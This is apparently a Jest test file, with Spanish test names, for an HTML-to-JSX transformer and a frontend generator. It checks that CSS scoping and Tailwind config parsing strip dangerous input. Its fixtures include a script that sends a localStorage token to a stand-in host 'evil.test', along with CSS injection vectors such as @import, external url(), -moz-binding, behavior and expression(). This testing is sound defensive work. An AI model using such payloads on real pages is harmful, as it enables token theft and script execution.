const { transformSync } = require('esbuild');
const HtmlToJsxTransformer = require('../src/infrastructure/services/HtmlToJsxTransformer');
const Frontend = require('../src/infrastructure/services/GenericFrontendGenerator');

const doc = ({ head = '', body = '', bodyAttrs = '' } = {}) => `<!DOCTYPE html><html><head>${head}</head><body${bodyAttrs}>${body}</body></html>`;
const compiles = (jsx) => transformSync(`const x = (<div>${jsx}</div>);`, { loader: 'jsx' });

describe('scopeCss', () => {
  const scope = (css) => HtmlToJsxTransformer.scopeCss(css, '.mockup-x');

  test('antepone el ámbito a cada selector, también en listas', () => {
    expect(scope('.card{color:red}')).toBe('.mockup-x .card{color:red}');
    expect(scope('a,.b > c{x:1}')).toBe('.mockup-x a,.mockup-x .b > c{x:1}');
  });

  test('html, body y :root pasan a ser el propio contenedor', () => {
    expect(scope('html,body{background:#fff!important}')).toBe('.mockup-x{background:#fff!important}');
    expect(scope(':root{--a:1}')).toBe('.mockup-x{--a:1}');
  });

  test('las reglas dentro de @media se acotan y los @keyframes se conservan con otro nombre', () => {
    expect(scope('@media (min-width:640px){.a{color:red}}')).toBe('@media (min-width:640px){.mockup-x .a{color:red}}');
    expect(scope('@keyframes spin{from{opacity:0}to{opacity:1}}')).toBe('@keyframes mockup-x-spin{from{opacity:0}to{opacity:1}}');
  });

  test('elimina @import, url() externos y comentarios; conserva data: y fragmentos', () => {
    const css = scope('/* nota */@import url(https://evil.test/x.css);.a{background:url(https://evil.test/p.png);color:red}.b{background:url(data:image/svg+xml;base64,AAA)}.c{filter:url(#f)}');
    expect(css).not.toContain('evil.test');
    expect(css).not.toContain('@import');
    expect(css).not.toContain('nota');
    expect(css).toContain('.mockup-x .a{color:red}');
    expect(css).toContain('url(data:image/svg+xml;base64,AAA)');
    expect(css).toContain('url(#f)');
  });

  test('un } dentro de una cadena no desincroniza el ámbito: la regla siguiente sigue acotada', () => {
    expect(scope('.a::after{content:"}"} input[type=password][value^="a"]{background:red} header.nav{display:none}'))
      .toBe('.mockup-x .a::after{content:"}"}.mockup-x input[type=password][value^="a"]{background:red}.mockup-x header.nav{display:none}');
    expect(scope('.a{content:"}"}')).toBe('.mockup-x .a{content:"}"}');
  });

  test('los marcadores de comentario dentro de una cadena se conservan; fuera se eliminan', () => {
    expect(scope('.a{content:"/* x */";color:red} /* fuera */ .b{color:blue}')).toBe('.mockup-x .a{content:"/* x */";color:red}.mockup-x .b{color:blue}');
  });

  test.each([
    ['image-set con cadena', '.a{background:image-set("https://evil.test/a" 1x)}'],
    ['src()', '.a{background:src("https://evil.test/a")}'],
    ['url escapado', '.a{background:u\\72l(https://evil.test/a)}'],
    ['url dentro de @keyframes', '@keyframes k{from{background:url(https://evil.test/k)}}.a{animation:k 1s}'],
    ['url dentro de @media', '@media (min-width:1px){.a{background:URL( "https://evil.test/a" )}}'],
    ['-moz-binding', '.a{-moz-binding:url(https://evil.test/x.xml#b)}'],
    ['behavior', '.a{behavior:url(https://evil.test/x.htc)}'],
    ['expression()', '.a{width:expression(alert(1))}']
  ])('no deja pasar recursos externos ni ejecución: %s', (_name, css) => {
    const out = scope(css);
    expect(out).not.toContain('evil.test');
    expect(out).not.toMatch(/expression|binding|behavior|image-set|src\(/i);
  });

  test('una barra invertida dentro de comillas se conserva; fuera de ellas se descarta la declaración', () => {
    expect(scope('.a{content:"\\201C"}')).toContain('content:"\\201C"');
    expect(scope('.a{width:calc(1px + \\31 0px);color:red}')).toBe('.mockup-x .a{color:red}');
  });

  test('descarta las reglas con efecto global (@property, @page, @font-face, @counter-style)', () => {
    expect(scope("@property --x{syntax:'<length>';inherits:false}@page{margin:0}@font-face{font-family:X;src:local(X)}@counter-style c{system:cyclic;symbols:a}")).toBe('');
  });

  test('los @keyframes se renombran con el ámbito y las animaciones que los usan los siguen', () => {
    expect(scope('@keyframes spin{to{opacity:1}} .a{animation:spin 1s infinite} .b{animation-name:spin}'))
      .toBe('@keyframes mockup-x-spin{to{opacity:1}}.mockup-x .a{animation:mockup-x-spin 1s infinite}.mockup-x .b{animation-name:mockup-x-spin}');
  });

  test('un anidamiento extremo no lanza y se acota', () => {
    expect(() => scope('@media x{'.repeat(20000))).not.toThrow();
  });

  test('CSS vacío o inválido no lanza', () => {
    expect(scope('')).toBe('');
    expect(() => scope('.a{color:red')).not.toThrow();
  });
});

describe('analyze', () => {
  test('separa los <style>, que no aparecen en el JSX', () => {
    const result = HtmlToJsxTransformer.analyze(doc({ head: '<style>.card{color:red}</style>', body: '<div class="card">x</div>' }));
    expect(result.css).toContain('.card{color:red}');
    expect(result.jsx).not.toContain('<style');
    expect(result.jsx).toContain('className="card"');
  });

  test('conserva clases y estilo del body', () => {
    const result = HtmlToJsxTransformer.analyze(doc({ bodyAttrs: ' class="bg-slate-50 min-h-screen" style="color:red;font-size:14px"', body: '<p>x</p>' }));
    expect(result.bodyClassName).toBe('bg-slate-50 min-h-screen');
    expect(result.bodyStyle).toEqual({ color: 'red', fontSize: '14px' });
  });

  test('lee tailwind.config como datos', () => {
    const head = '<script src="https://cdn.tailwindcss.com"></script><script>tailwind.config = { theme: { extend: { colors: { primary: { 500: \'#111111\', "600": "#222222" } } } } }</script>';
    expect(HtmlToJsxTransformer.analyze(doc({ head })).tailwindConfig).toEqual({ theme: { extend: { colors: { primary: { 500: '#111111', 600: '#222222' } } } } });
  });

  test.each([
    ['código añadido tras la configuración', "tailwind.config = { theme: {} }; fetch('//evil.test/' + localStorage.icase_token)"],
    ['llamada a función dentro del objeto', 'tailwind.config = { theme: { extend: { x: foo() } } }'],
    ['acceso a propiedades', 'tailwind.config = { theme: { extend: { x: window.name } } }'],
    ['sintaxis inválida', 'tailwind.config = { theme: ']
  ])('no ejecuta ni acepta una configuración con %s', (_name, script) => {
    expect(HtmlToJsxTransformer.analyze(doc({ head: `<script>${script}</script>` })).tailwindConfig).toBeNull();
  });

  test('detecta si el mockup trae su propio menú: un aside, o un nav con enlaces a varias pantallas', () => {
    const routes = new Set(['/a', '/b']);
    expect(HtmlToJsxTransformer.analyze(doc({ body: '<aside><a href="#">A</a></aside>' })).hasShell).toBe(true);
    expect(HtmlToJsxTransformer.analyze(doc({ body: '<nav><a href="/a">A</a><a href="/b?x=1">B</a></nav>' }), { routes }).hasShell).toBe(true);
    expect(HtmlToJsxTransformer.analyze(doc({ body: '<nav><a href="/a">A</a></nav>' }), { routes }).hasShell).toBe(false);
    expect(HtmlToJsxTransformer.analyze(doc({ body: '<nav><a href="#">1</a><a href="#">2</a><a href="#">3</a></nav>' }), { routes }).hasShell).toBe(false);
    expect(HtmlToJsxTransformer.analyze(doc({ body: '<main><p>x</p></main>' })).hasShell).toBe(false);
  });

  test('comportamiento previo: transform devuelve el mismo JSX que analyze', () => {
    const html = doc({ head: '<style>.a{}</style>', body: '<div class="a">x</div>' });
    expect(HtmlToJsxTransformer.transform(html)).toBe(HtmlToJsxTransformer.analyze(html).jsx);
  });
});

describe('enlaces internos como <Link>', () => {
  const routes = new Set(['/reservas', '/mesas']);
  const jsx = (body) => HtmlToJsxTransformer.transform(doc({ body }), { routes });

  test('un href a una ruta conocida pasa a <Link to> y conserva el resto de atributos', () => {
    const result = jsx('<a href="/reservas" class="nav">Reservas</a>');
    expect(result).toBe('<Link to="/reservas" className="nav">Reservas</Link>');
    expect(() => compiles(result)).not.toThrow();
  });

  test('conserva la consulta y el fragmento de la ruta', () => {
    expect(jsx('<a href="/mesas?zona=a#top">Mesas</a>')).toContain('<Link to="/mesas?zona=a#top">');
  });

  test.each([
    ['externo', 'https://example.com'],
    ['mismo protocolo', '//example.com/reservas'],
    ['fragmento', '#'],
    ['ruta desconocida', '/otra'],
    ['sin href', '']
  ])('no cambia un enlace %s', (_name, href) => {
    const result = jsx(href ? `<a href="${href}">x</a>` : '<a>x</a>');
    expect(result).not.toContain('<Link');
    expect(result).toContain('<a');
  });

  test('un enlace con data-accion sigue siendo <a>', () => {
    expect(jsx('<a href="/reservas" data-accion="RF-01.consultar">x</a>')).not.toContain('<Link');
  });

  test('comportamiento previo: sin rutas nada se convierte', () => {
    expect(HtmlToJsxTransformer.transform(doc({ body: '<a href="/reservas">x</a>' }))).not.toContain('<Link');
  });
});

describe('GenericFrontendGenerator: pantallas con mockup', () => {
  const html = doc({
    head: '<style>.card{color:red}</style><script src="https://cdn.tailwindcss.com"></script><script>tailwind.config = { theme: { extend: { colors: { primary: { 500: "#123456" } } } } }</script>',
    bodyAttrs: ' class="bg-slate-50 min-h-screen" style="font-size:14px"',
    body: '<aside><a href="/mesas">Mesas</a></aside><main><div class="card">Reservas</div></main>'
  });
  const screens = [
    { nombre: 'Reservas', slug: 'reservas', ruta: '/reservas', rf_trazabilidad: ['RF-01'], mockup: { preview_code: html } },
    { nombre: 'Mesas', slug: 'mesas', ruta: '/mesas', rf_trazabilidad: ['RF-02'] },
    { nombre: 'Plano', slug: 'plano', ruta: '/plano', rf_trazabilidad: ['RF-03'], mockup: { preview_code: doc({ body: '<main><p>Plano</p></main>' }) } }
  ];
  const generate = (extra = {}) => new Frontend().generate({ proyecto: { nombre: 'Salas' }, screens, decisiones: {}, requerimientos: [], ...extra });
  const file = (files, ruta) => files.find((item) => item.ruta === ruta)?.contenido;

  test('el CSS del mockup va en un archivo propio, acotado a su pantalla, y la página lo importa', () => {
    const files = generate();
    expect(file(files, 'frontend/src/pages/reservas.css')).toContain('.mockup-reservas .card{color:red}');
    const page = file(files, 'frontend/src/pages/reservas.jsx');
    expect(page).toContain("import './reservas.css';");
    expect(() => transformSync(page, { loader: 'jsx' })).not.toThrow();
  });

  test('clases y estilo del body pasan al contenedor y la pantalla usa un contenedor sin ancho máximo', () => {
    const page = file(generate(), 'frontend/src/pages/reservas.jsx');
    expect(page).toContain('className="mockup-content mockup-reservas bg-slate-50 min-h-screen"');
    expect(page).toContain('fontSize');
    expect(page).toMatch(/className=\{showCrud \? 'page-container screen' : 'mockup-screen'\}/);
    expect(file(generate(), 'frontend/src/styles.css')).toMatch(/\.mockup-screen\{[^}]*max-width:none/);
  });

  test('los enlaces a otras pantallas usan <Link> y la página importa el router', () => {
    const page = file(generate(), 'frontend/src/pages/reservas.jsx');
    expect(page).toContain('<Link to="/mesas">Mesas</Link>');
    expect(page).toContain("import { Link } from 'react-router-dom';");
    expect(file(generate(), 'frontend/src/pages/plano.jsx')).not.toContain("from 'react-router-dom'");
  });

  test('la configuración de Tailwind del mockup se aplica en index.html sin copiar su script', () => {
    const index = file(generate(), 'frontend/index.html');
    expect(index).toContain('tailwind.config');
    expect(index).toContain('#123456');
    expect(index.indexOf('cdn.tailwindcss.com')).toBeLessThan(index.indexOf('tailwind.config'));
  });

  test('sin configuración en los mockups se deriva del sistema de diseño', () => {
    const index = file(generate({ screens: [screens[2]], sistemaDiseno: { colores: { primario: '#abcdef', primario_oscuro: '#0a0b0c', secundario: '#888888' } } }), 'frontend/index.html');
    expect(index).toContain('#abcdef');
    expect(index).toContain('#0a0b0c');
  });

  test('una configuración con código añadido no llega al index.html', () => {
    const evil = doc({ head: "<script>tailwind.config = { theme: {} }; fetch('//evil.test/' + localStorage.icase_token)</script>", body: '<main>x</main>' });
    const index = file(generate({ screens: [{ ...screens[2], mockup: { preview_code: evil } }] }), 'frontend/index.html');
    expect(index).not.toContain('evil.test');
    expect(index).not.toContain('localStorage');
  });

  test.each([[false], [true]])('la cabecera oculta el menú de pantallas solo en las rutas cuyo mockup trae su propio menú (con sesión: %s)', (auth) => {
    const decisiones = auth ? { control_acceso: { autenticacion: { metodo: 'jwt' } } } : {};
    const app = file(generate({ decisiones }), 'frontend/src/App.jsx');
    expect(app).toContain('const standalone = ["/reservas"];');
    expect(app).toContain('standalone.includes(location.pathname)');
    if (auth) {
      expect(app).toContain('!standalone.includes(location.pathname) && modules.map');
      expect(app).toMatch(/user\.administrador && \(\s*<Link\s+to="\/usuarios"/);
    }
  });

  test.each([[false], [true]])('el frontend completo se empaqueta con CSS por pantalla, <Link> y menú oculto (con sesión: %s)', (auth) => {
    const fs = require('node:fs');
    const os = require('node:os');
    const path = require('node:path');
    const { buildSync } = require('esbuild');
    const directory = fs.mkdtempSync(path.join(os.tmpdir(), 'mockup-styles-'));
    try {
      for (const item of generate({ decisiones: auth ? { control_acceso: { autenticacion: { metodo: 'jwt' } } } : {} })) {
        const target = path.join(directory, item.ruta);
        fs.mkdirSync(path.dirname(target), { recursive: true });
        fs.writeFileSync(target, item.contenido);
      }
      const bundle = buildSync({
        entryPoints: [path.join(directory, 'frontend/src/App.jsx')], bundle: true, write: false, logLevel: 'silent', outdir: path.join(directory, 'out'),
        external: ['react', 'react-dom', 'react-router-dom'], loader: { '.js': 'jsx', '.jsx': 'jsx' }
      });
      const css = bundle.outputFiles.find((output) => output.path.endsWith('.css'))?.text || '';
      expect(css).toContain('.mockup-reservas .card');
    } finally { fs.rmSync(directory, { recursive: true, force: true }); }
  });

  test('comportamiento previo: sin <style>, body ni enlaces la página no cambia salvo el contenedor', () => {
    const page = file(generate(), 'frontend/src/pages/plano.jsx');
    expect(page).not.toContain('.css');
    expect(page).toContain('className="mockup-content mockup-plano"');
    expect(page).toContain('Gestión de Datos (API)');
  });
});
